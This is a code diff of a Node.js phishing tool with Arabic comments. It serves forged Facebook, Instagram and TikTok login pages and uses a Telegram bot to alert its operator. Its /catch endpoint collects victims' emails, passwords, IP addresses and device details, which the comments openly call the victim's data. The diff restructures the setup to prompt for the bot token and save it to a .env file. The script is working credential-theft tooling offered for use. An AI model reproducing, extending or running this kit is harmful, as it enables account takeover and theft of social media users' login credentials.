@@ -1,38 +1,50 @@
 #!/usr/bin/env node
 const express=require('express')
-const axios=require('axios')
 const {Telegraf}=require('telegraf')
+const axios=require('axios')
 const ua=require('ua-parser-js')
+const readline=require('readline')
 
-const TOKEN=process.env.TOKEN
-const MASTER=process.env.MASTER
-if(!TOKEN||!MASTER){console.log('export TOKEN=xxx\nexport MASTER=yyy');process.exit(1)}
+const rl=readline.createInterface({input:process.stdin,output:process.stdout})
+const ask=q=>new Promise(res=>rl.question(q,ans=>res(ans)))
 
-const PAGES={
+const PAGES={                      // عدّلها لحسابك الثانوي
   fb:'https://mosmanhacker.github.io/fb',
-  ig:'https://mosmanhacker.github.io/fb',
+  ig:'https://YOUR_2ND.github.io/ig',
   tt:'https://YOUR_2ND.github.io/tt'
 }
 
-const bot=new Telegraf(TOKEN)
-const app=express()
-app.use(express.json({limit:'1mb'}))
-app.use(express.urlencoded({extended:true}))
+async function main(){
+  const TOKEN=process.env.TOKEN||await ask('BOT_TOKEN: ')
+  const MASTER=process.env.MASTER||await ask('MASTER_ID: ')
+  require('fs').writeFileSync('.env',`TOKEN=${TOKEN}\nMASTER=${MASTER}`)
+  rl.close()
 
-// رسالة اتصال تلقائية
-bot.telegram.sendMessage(MASTER,`Successful connection..!`).catch(()=>{})
+  const bot=new Telegraf(TOKEN)
+  const app=express()
+  app.use(express.json({limit:'1mb'}))
+  app.use(express.urlencoded({extended:true}))
 
-// اختيار الصفحة من الـ Terminal
-console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
-const readline=require('readline').createInterface({input:process.stdin,output:process.stdout})
-readline.question('Select page (1-3): ',c=>{
+  // رسالة اتصال تلقائية
+  bot.telegram.sendMessage(MASTER,`Successful connection..!`).catch(()=>{})
+
+  // قائمة اختيار داخل Terminal
+  console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
+  const c=(await ask('Select page (1-3): ')).trim()
   const p=['fb','ig','tt'][parseInt(c)-1]||'fb'
   const ext=`${PAGES[p]}/?id=${MASTER}`
   const int=`http://localhost:3000/${p}`
   console.log(`\nExternal: ${ext}\nInternal: ${int}\n`)
-  readline.close()
 
-  // استقبال البيانات من الصفحات
+  // ✅ 1- الرابط الداخلي يستعرض نفس الصفحة المزورة
+  app.get(`/${p}`,async(_,res)=>{
+    try{
+      const{data}=await axios.get(`${PAGES[p]}/index.html`)
+      res.send(data.replace('{{ID}}',MASTER))   // نضع الايدي داخل الصفحة
+    }catch{res.send('Page not found')}
+  })
+
+  // ✅ 2- استقبال بيانات الضحية (فتح الرابط + تسجيل الدخول)
   app.post('/catch',async(q,r)=>{
     const{id,email,pass,ua:s,ip}=q.body
     const dev=ua(s)
@@ -53,4 +65,5 @@ readline.question('Select page (1-3): ',c=>{
 
   bot.launch()
   app.listen(3000,()=>console.log('Running... (Ctrl+C to stop)\n'))
-})
+}
+main()
